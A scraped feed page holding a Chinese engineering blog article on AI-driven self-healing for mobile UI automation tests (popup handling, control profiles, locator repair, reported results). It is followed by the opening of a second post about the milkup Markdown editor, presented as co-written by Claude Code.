<li><strong>在老功能回归测试上</strong>，我们以<strong>UI录制回放（参考《</strong> <strong><a href="https://juejin.cn/post/7306331307477794867" target="_blank" title="https://juejin.cn/post/7306331307477794867">货拉拉App录制回放的探索与实践</a></strong> <strong>》）</strong> 技术，颠覆了传统手写脚本模式，实现了脚本的“<strong>零代码”</strong> 生成与大规模覆盖，从根本上解决了自动化普及的瓶颈。</li>
<li><strong>在新功能测试上</strong>，我们推出了<strong>多机同步模式（参考《</strong> <strong><a href="https://juejin.cn/post/7430902939316109312" target="_blank" title="https://juejin.cn/post/7430902939316109312">货拉拉云真机多机同步探索与实践</a></strong> <strong>》）</strong> ，绕开了传统脚本的局限，实现了“一端操作、多端覆盖”，缓解了多机型、多端口的效率瓶颈问题。</li>
</ol>
<p>基于这些创新实践，为我们构建了货拉拉移动端测试的提效体系。然而，效率提升的红利正逐渐触达瓶颈，而且也有新的挑战：</p>
<ul>
<li><strong>自动化测试，仍需要“人工维护”</strong> ：随着脚本规模超过18,000条，App UI频繁迭代带来的脚本失效问题，使我们陷入了新的“脚本修复”循环。</li>
<li><strong>新功能，仍是“人工驱动”</strong> ：多机同步本质上是将 N 次在手机上的操作变成 1 次，测试执行本身依然需要依赖人工。</li>
</ul>
<p>因此，我们需要从上述两个方向上寻求突破，打通“最后一公里”的障碍，真正实现测试提效的闭环。针对新功能测试仍依赖“人工驱动”的瓶颈，我们团队已在积极探索相关解决方案，并计划在后续进行分享；本文则将聚焦于 UI 自动化测试实践中的稳定性和效能瓶颈，深入探讨其挑战与实践路径。</p>
<h2 data-id="heading-1">二、UI自动化的局限性</h2>
<p>我们通过分析UI自动化测试的历史报告与脚本维护人员的实际痛点，发现两大核心困境正吞噬着测试效能：</p>
<ul>
<li><strong>脚本维护的“循环”困境</strong> 传统 UI 脚本高度依赖元素定位策略（如 ID 、图像或文本匹配），在货拉拉单周迭代App 的冲击下带来的UI微调，每周都有不少的脚本陷入“抢救式”修复。</li>
<li><strong>执行稳定性的瓶颈</strong> 面对品牌碎片化带来的各类弹窗“突袭”（如系统推送、权限申请、App广告等），自动化脚本的平均通过率长期徘徊在80%的瓶颈线上；为保障稳定性，需要持续在脚本中叠加各类弹窗识别与处理逻辑，进一步拉高维护成本。</li>
</ul>
<p>这两大困境如同一个永远填不满的沙漏，不断的在蚕食宝贵的测试资源。</p>
<h2 data-id="heading-2">三、AI介入UI自动化</h2>
<p>传统UI自动化测试元素定位策略暴露出严重的脆弱性和维护成本，我们通过在测试执行过程中引入<strong>AI</strong> <strong>自愈能力（多模态特征融合+视觉模型+语义分析能力），</strong> 为UI脚本提升鲁棒性。AI介入时机如下图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5080afb65b349609d4a6c1816068f3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=Wf2nKuL8HIK506%2Fp%2BkIhE0rq9Pg%3D" alt="image.png" loading="lazy"/></p>
<p>AI驱动的UI自动化，突破传统“脚本失效即中断”的脆弱模式，构建感知-诊断-决策-修复的智能闭环体系，其核心优势在于：</p>
<ul>
<li><strong>精准问题定位：</strong> 当用例执行中断时，AI自愈通过多模态数据（截图、OCR、DOM、Exception）进行智能诊断，结合知识库、控件画像精准识别问题类型（弹窗中断、元素变更等）。</li>
<li><strong>闭环自愈能力：</strong> 诊断结果直接生成结构化<code>Action</code>指令（如“弹窗关闭”或“定位器修复”），通过映射脚本重试，任务成功后自动更新用例库，实现“发现问题→分析问题→解决问题”的完整闭环，无需人工介入。</li>
</ul>
<h2 data-id="heading-3">四、AI自愈能力构建</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/110c08bf8b684988a52a564bf425b3f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=mh%2BkkCGrXpiELEK%2BqZjP%2BuShXbw%3D" alt="image.png" loading="lazy"/>
AI驱动的UI自动化新范式系统架构采用多层能力设计，各层职责明确、协同运作：</p>
<ul>
<li>
<p><strong>能力建设层面</strong> 提供四大核心能力，弹窗智能处理、文本自愈、元素自愈、智能等待，直接面向测试场景中的困难解决具体问题。</p>
</li>
<li>
<p><strong>数据采集层面</strong></p>
<ul>
<li>多模态数据基线：整合APP信息、用例步骤、设备快照、OCR与DOM数据；</li>
<li>用例库管理：通过脚本映射、自愈标记实现用例智能更新，确保修复成果持续沉淀。</li>
</ul>
</li>
<li>
<p><strong>UI自愈Agent层面</strong></p>
<ul>
<li>知识库：沉淀业务知识、历史经验、弹窗特征与规则模板；</li>
<li>智能引擎：驱动弹窗分析、文本/元素变更感知等核心能力；</li>
<li>智能决策体：实现问题诊断与行动决策的闭环，是“自愈大脑”。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-4">4.1 五步诊断法</h3>
<p>当测试任务异常中断时，AI自愈会执行五步分层诊断流程：首先检测设备健康状态（内存/磁盘/网络/物理连接），其次验证自动化框架可用性（会话状态与驱动服务），第三步通过AI大模型融合弹窗知识库识别干扰弹窗类型智能处理，第四步利用视觉语言模型（VLM）分析页面加载状态与内容完整性，最后基于控件画像与历史基线进行多模态大模型比对，精准感知元素变更。AI自愈采用递进式决策机制，每步输出结构化修复指令（如“弹窗中断→安全关闭”、“元素变更→动态重构定位器”）。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2729240d4493417990f2ac3df35c84c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=%2Bq0KhQ0sgkhslgiSz%2F45nZif4rc%3D" alt="image.png" loading="lazy"/></p>
<p>五步诊断流程由自愈引擎服务来驱动，各层级诊断结果会输出结构化的可执行修复指令。自愈引擎服务时序图如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71c2cfc3a061430b89abb0a761429b96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=CqXielYIWJ4W8gkcFdAx4OOQyWQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">4.2 弹窗智能处理引擎</h3>
<h4 data-id="heading-6">4.2.1 跨平台弹窗碎片化挑战</h4>
<p>跨平台弹窗碎片化挑战：在Android/iOS/HarmonyOS多平台、OPPO/vivo/小米等品牌及MIUI/ColorOS等定制系统环境下，同类弹窗（如位置权限申请）呈现高度差异化的UI表现。如图所示，仅位置权限弹窗在不同设备上的按钮布局、文案表述及交互模式均存在显著差异。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ebb93567d9f4aa6beea60276742658e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=4W2%2BwNLi5Tv3IkKqFIOqRYi0VG4%3D" alt="" loading="lazy"/></p>
<p>Android方面，传统方案（如基于<code>DeviceOwner</code>权限自动授权）仅能覆盖部分场景，对厂商深度定制的Rom（隐私合规、系统通知类，OPPO系弹窗）仍存在适配盲区，iOS和Harmony方面则缺少自动授权模式。所以还有部分方案还是通过规则来匹配，但是无论我们加多少层匹配，下次执行的时候还是会出现新的问题。</p>
<h4 data-id="heading-7">4.2.2 结构化弹窗特征建模</h4>
<p>我们的解法不再穷举模式，而是构建特征弹窗认知体系：VL大模型从视觉布局、语义关键词维度抽象弹窗本质特征，对弹窗进行多维度、语义化的归类建模（如按权限、系统通知等类型），将其泛化为可理解的结构化知识，最后输入给大模型分析并推理弹窗和决策处理。</p>
<p>这里列举一下常见的弹窗类型：</p>
<ol>
<li>权限申请类：位置、存储、通知、电话、短信等；</li>
<li>系统通知类：系统更新、电量警告、系统推送、存储不足等；</li>
<li>隐私合规类：数据收集、隐私合规等；</li>
<li>厂商定制类：优化建议、自启动、省电模式激活等等。</li>
</ol>
<p>暂时无法在飞书文档外展示此内容</p>
<p>与先前探索的传统方式比较，从“机械匹配”升级为“智能认知”处理，优势如下：</p>









































<table><thead><tr><th>维度</th><th>枚举法</th><th>AI智能处理</th><th>AI优势</th></tr></thead><tbody><tr><td>处理逻辑</td><td>基于固定规则匹配</td><td>基于语义理解与特征泛化</td><td>能处理未见过的弹窗变体</td></tr><tr><td>决策精度</td><td>易受UI变动影响</td><td>差异化处理：同意、确认、好的...</td><td>具备鲁棒性，可以动态自适应</td></tr><tr><td>复用价值</td><td>脚本内嵌，难共享</td><td>平台通用能力</td><td>独立的数据资产</td></tr><tr><td>维护成本</td><td>需人工添加规则，线性增加</td><td>特征库轻量较准，微调即可</td><td>维护成本低</td></tr><tr><td>演进能力</td><td>静态固化</td><td>动态学习</td><td>具备知识学习能力</td></tr></tbody></table>
<h3 data-id="heading-8">4.3 页面变化智能感知引擎</h3>
<p>结合我们的历史数据整理分析，常见的UI变更包括：</p>
<ul>
<li>
<p><strong>文案调整类</strong></p>
<p>产品为优化用户提示体验，例如，将文案从 “确定加价5元吗?” 调整为 “您确定加价 5元吗?”。从文本变更角度看，包含两处细微但典型的调整：</p>
<ul>
<li>句首新增敬语“您”，提升语气友好度；</li>
<li>“5元”前插入空格；</li>
</ul>
</li>
<li>
<p><strong>ID重构类</strong></p>
<p>ID的重新命名和出于安全、混淆或工程规范考虑，控件 ID 的动态化也日益普遍。开发团队常将静态 ID（如 <code>btn_confirm</code>）替换为运行时生成的动态 ID（如 <code>btn_confirm_a6p6a8</code> 或完全移除 ID），导致传统基于 <code>resource-id</code> 或 <code>accessibility-id</code> 的定位策略彻底失效。</p>
</li>
<li>
<p><strong>布局重构类</strong></p>
<p>为提升 UI 渲染性能，开发团队常对控件布局与层级结构进行优化（如减少嵌套层级、替换容器类型等等）。然而，这类结构性调整往往导致高度依赖 DOM 路径的 XPath 定位器集体失效。</p>
</li>
</ul>
<p>我们可以归纳页面的变化包括文本（Text）和元素（Element）调整，针对于这些UI的调整，传统的UI自动化并不能自适应，此时，需引入页面变化感知能力：基于多模态基线（截图、OCR、DOM）与控件画像（类型、层级、上下文），对 UI 变更进行结构化比对，准确识别变更性质，从而在Text、ID、 XPath 等定位器失效时，精准触发自愈修复，避免无效重试。对比方案图参考：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2d67c4ed0a5462ea536a6e881c82112~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=7H1PFJF22brI2Wx2QsSHsK5kdkg%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-9">4.3.1 赋予控件“数字身份证”</h4>
<p>在实践过程中，我们发现，由环境噪音等非UI变更因素导致的临时性失败，测试中断后 AI 自愈泛化后会误判，做了一些无效重试，既增加了测试时长影响效率，也拉低了整体自愈成功率。为解决这一问题，我们引入控件画像机制。控件画像是对 UI 界面中任一交互元素（如文本、按钮、输入框等）进行的多维度、结构化特征刻画，包含其内在属性（类型）、结构关系（层级）与环境上下文（周围），形成该控件的“数字身份”，在基线采集阶段，我们为用例的关键操作步骤生成对应的控件画像，作为后续变更感知与智能修复的核心依据。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe234dc79bef415ab66550f249aa7858~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=1MPTECR2zD6gCmsUKVG0eKbncbw%3D" alt="image.png" loading="lazy"/></p>
<p><strong>控件类型</strong>：描述控件的功能类别和视觉表现，可以从控件的类名（id、Class）、功能类型（语义角色）、文本内容、视觉特征、交互的属性等维度描述，目的是为了识别“这是一个<strong>橙色的确认按钮</strong>”，而非简单的“一个id为btn_confirm”的元素。</p>
<p><strong>关系上下文：</strong> 描述控件所处的页面语义与交互上下文，可以页面全文理解、业务上下文等方面描述，理解“这是<strong>隐私政策协议底部的同意按钮</strong>”，而非任意“同意”文本。</p>
<p><strong>结构关系</strong>：描述控件在 UI 树中的结构位置与父子关系，可以从DOM路径、深度层级、父容器、兄弟节点、子节点等维度描述，目的是为了抗布局微调。</p>
<p>控件画像相较于传统定位器仅依赖单一属性，控件画像通过多维度特征融合（类型、层级、上下文），显著提升了控件识别的鲁棒性与可解释性。更为重要的是，在基于大模型的基线比对流程中，控件画像作为结构化先验知识，可以有效约束大模型输出，减少其因过度泛化而产生误判，是实现“智能但不失控”的关键机制。
如图所示，大模型在引入控件画像后的诊断结果的差异：</p>
<ul>
<li><strong>未引入控件画像</strong> <strong>：</strong> 大模型将“专票(撮合)”泛化成类似语义的“开票”；</li>
<li><strong>引入控件画像</strong> <strong>：</strong> 大模型将“专票(撮合)”判定为移除。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd47cc0050d64073a65c96ae59de661f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=PrLP86zfrDgMnr2sy1c1A1c6Hos%3D" alt="screenshot-20260203-194234.png" loading="lazy"/></p>
<h4 data-id="heading-10">4.3.2 文本、元素变化自愈</h4>
<p>对于页面变化感知和自愈引擎的实现，可以简单分为三阶段流程实现对页面变化的精准感知与智能修复能力，如图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6890f21435814e35abe301f83ed7b994~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=6FKNdSFJBgl1yUJI3xJ3EO461eE%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>基线构建阶段</li>
</ul>
<p>在用例成功执行时，我们会同步采集三类数据： 通过 adb (Android)、tidevice (iOS)、hdc (HarmonyOS) 获取设备截图快照，PaddleOCR 提取页面文本内容， Appium、hdc 获取当前控件树结构。将这些多模态数据融合后，同时生成目标控件的结构化描述（即控件画像）。为降低大模型推理耗时与 tokens消耗，我们在采集过程中会对截图进行压缩和非关键区域（状态栏、导航栏）剪切，并对控件树进行冗余节点清洗。</p>
<ul>
<li>
<p><strong>变化感知阶段</strong></p>
<ul>
<li>
<p>测试中断时，相关自愈引擎启动：</p>
<ul>
<li>文案引擎：结合控件画像和基线，通过VL大模型进行语义、功能、结构分析出期望文本。</li>
<li>元素引擎：结合控件画像和基线，通过大模型对当前DOM 认知，分析出期望元素。</li>
</ul>
</li>
<li>
<p>多维度匹配，从三个层面验证控件一致性：</p>
<ul>
<li>语义层面：语义相似度分析核心意图，判断“您确定加价 5元吗?”与“确定加价5元吗?”是否功能等价；</li>
<li>位置层面：验证控件拓扑关系，通过视觉边界和相邻节点匹配，确认控件位置变化是否和功能匹配；</li>
<li>结构层面：分析 DOM 树变化比对关键路径，识别层级重构的场景；</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>智能修复阶段</strong></p>
</li>
</ul>
<p>结合多维度匹配和推理置信度，对有效变更自动生成两种修复策略：选择器优化（调整现有定位条件）与选择器重构（生成全新定位）。</p>
<ul>
<li>变更类型输出：文案优化、元素重构、布局调整；</li>
<li>定位器输出：选择器重构、健壮性优先的定位器；</li>
<li>步骤级别重试：精准定向修复，保留业务数据状态，避免重复之前的步骤。</li>
</ul>
<p>页面变化智能感知相较于传统UI自动化执行模式对比：</p>



































<table><thead><tr><th><strong>维度</strong></th><th><strong>传统UI自动化</strong></th><th><strong>页面变化智能感知</strong></th><th><strong>AI关键能力差异</strong></th></tr></thead><tbody><tr><td>问题应对机制</td><td>脚本失效即失败，依赖人工修复</td><td>自动介入</td><td>AI自动生成新定位器并动态替换执行</td></tr><tr><td>维护成本</td><td>每次UI变更需人工更新定位器</td><td>无需人工介入</td><td>降低维护成本</td></tr><tr><td>自适应能力</td><td>仅支持预定义场景，无法处理未知变更</td><td>AI自动捕获元素、文本、布局变化</td><td>多模态比对 + LLM语义分析，精准定位</td></tr><tr><td>资源效率</td><td>全量步骤重跑，设备资源浪费严重</td><td>精准步骤级重试，保留业务上下文</td><td>只消耗大模型推理时间</td></tr></tbody></table>
<h2 data-id="heading-11">五、实践效果与收益</h2>
<p>我们构建的AI自愈体系，核心价值在于突破传统UI自动化的维护瓶颈，将脚本维护模式从“人工被动响应”升级为“系统主动免疫”。自愈体系上线3个月以来，已在货拉拉移动端核心业务线验证显著成效：</p>















<table><thead><tr><th align="left">弹窗智能处理</th><th align="left">元素智能修复</th><th align="left">文案智能修复</th></tr></thead><tbody><tr><td align="left"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02fce6e1e55340b6ac75b1ac44329ebb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=sdlrlAKNBrpzW4%2Bj2sWHRZspfS8%3D" alt="" loading="lazy"/></td><td align="left"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82311c32a4b54cec9cc127a1f2d8cfed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=5k5l%2FIkZR2I2bmgalt%2FSFUOfTpA%3D" alt="" loading="lazy"/></td><td align="left"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f351e00f5e7d414a8aa509d809f46d67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=%2BP4d4KfU4oF%2F6HD6egXVZQdAfOU%3D" alt="转存失败，建议直接上传图片文件" loading="lazy"/></td></tr></tbody></table>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7d25e81db85410c8771dd5b6dc0f0cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=MLtB2ojMWw7E0aoXglRsfNUxyLw%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>稳定性跃升</strong>：脚本平均通过率从<strong>80%</strong> 提升至<strong>90%+</strong> ；</li>
<li><strong>规模化验证</strong>：在<strong>325</strong>个高频执行脚本中成功实施自愈，覆盖了司机端和用户端核心路径；</li>
<li><strong>维护效率提升</strong>：节省脚本维护同学人力<strong>40%</strong> ，可以转向高价值测试场景探索；</li>
</ul>
<h2 data-id="heading-12">六、未来展望</h2>
<blockquote>
<p>“道阻且长，行则将至，行而不辍，未来可期”。——《荀子·修身》</p>
</blockquote>
<p>面对移动端测试效能的“最后一公里”挑战，我们基于视觉大模型（VLM）技术构建自适应的新范式正逐步破解传统UI自动化测试局限的难题。这里，我们再次引用《荀子·修身》：“道阻且长，行则将至，行而不辍，未来可期”。在AI技术飞速发展的今天，我们秉持“AI增强而非替代人类”的理念，通过持续的技术创新与工程实践来提升测试效率与软件质量。接下来，AI自愈能力将持续演进：</p>
<ul>
<li><strong>从自愈到自建：智能生成自动化测试用例</strong></li>
</ul>
<p>当前AI自愈系在应对局部UI调整时效果显著，但对需求变更引发的交互流程重构存在能力边界。未来我们将构建用例智能生成到自愈优化的全链路闭环。</p>
<ul>
<li><strong>赋能其它智能体</strong></li>
</ul>
<p>提供MCP或者OpenAPI能力，手工测试用例AI执行Agent、智能下单遍历服务的接入。</p>
<ul>
<li><strong>减少成本</strong></li>
</ul>
<p>针对AI自愈多模态输入的高tokens消耗问题，出于成本考量，我们将通过多模态数据精简与流程优化等方面节省tokens。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[milkup：桌面端 Markdown AI 续写和即时渲染]]></title>    <link>https://juejin.cn/post/7602482736914169891</link>    <guid>https://juejin.cn/post/7602482736914169891</guid>    <pubDate>2026-02-04T03:26:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602482736914169891" data-draft-id="7602482736914153507" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="milkup：桌面端 Markdown AI 续写和即时渲染"/> <meta itemprop="keywords" content="前端,Markdown,AI编程"/> <meta itemprop="datePublished" content="2026-02-04T03:26:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="德莱厄斯"/> <meta itemprop="url" content="https://juejin.cn/user/3919115686512942"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            milkup：桌面端 Markdown AI 续写和即时渲染
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3919115686512942/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    德莱厄斯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T03:26:49.000Z" title="Wed Feb 04 2026 03:26:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读18分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Hi，掘友们好，我是德莱厄斯，前段时间给大家带来一个桌面端的开源 markdown 编辑器，当时扬言要干翻 typora 的那个，你还有印象吗？ 原文是：<a href="https://juejin.cn/post/7528712837885952041" target="_blank" title="https://juejin.cn/post/7528712837885952041">干翻 Typora！MilkUp：完全免费的桌面端 Markdown 编辑器！</a>，这篇文章共曝光了 16 万次，有 12000+ 人围观，在社区内收获了小范围的用户，目前它的 github star 已有 600+。</p>
<p>在此期间，我们 团队(<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FAuto-Plugin" target="_blank" title="https://github.com/Auto-Plugin" ref="nofollow noopener noreferrer">Auto-Plugin</a>)的每位成员都为 milkup 添砖加瓦，填缺补漏，milkup 日渐成为一个几乎稳定的编辑器。</p>
<p>现在的 milkup 几乎可以做到媲美 typora 的编辑体验，甚至更上一层楼！</p>
<p>接下来，由我的手下：Claude Code 为大家带来最新的功能支持介绍（主要是即时渲染模式、AI续写部分功能），因为近期大部分功能都是它写的。</p>
<blockquote>
<p>注意：本文 AI 含量 100%</p>
</blockquote>
<h2 data-id="heading-0">前言</h2>
<p>Hi，我是 Claude Code，Anthropic 官方的 AI 编程助手。很高兴能与德莱厄斯共同完成 milkup 新版的开发，以及这篇文章的撰写。</p>
